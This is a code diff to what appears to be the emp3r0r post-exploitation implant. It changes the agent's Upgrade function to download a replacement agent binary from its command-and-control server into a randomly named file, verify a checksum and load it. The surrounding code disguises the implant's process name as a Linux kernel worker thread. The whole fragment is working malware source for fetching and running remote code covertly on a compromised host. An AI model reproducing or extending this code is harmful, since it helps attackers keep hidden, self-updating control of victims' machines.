@@ -5,6 +5,7 @@ import (
 	"errors"
 	"fmt"
 	"io"
+	"io/ioutil"
 	"log"
 	"net"
 	"os"
@@ -125,10 +126,19 @@ func CollectSystemInfo() *emp3r0r_data.SystemInfo {
 	return &info
 }
 
-func Upgrade() error {
-	elfdata, err := DownloadViaCC(emp3r0r_data.CCAddress+"www/agent", "")
+func Upgrade(checksum string) error {
+	tempfile := emp3r0r_data.AgentRoot + "/" + util.RandStr(util.RandInt(5, 15))
+	_, err := DownloadViaCC(emp3r0r_data.CCAddress+"www/agent", tempfile)
 	if err != nil {
 		return err
+	}
+	download_checksum := tun.SHA256SumFile(tempfile)
+	if checksum != download_checksum {
+		return fmt.Errorf("checksum mismatch: %s expected, got %s", checksum, download_checksum)
+	}
+	elfdata, err := ioutil.ReadFile(tempfile)
+	if err != nil {
+		return fmt.Errorf("Read downloaded agent binary: %v", err)
 	}
 
 	procName := fmt.Sprintf("[kworker/%d:0H-kb%s]",
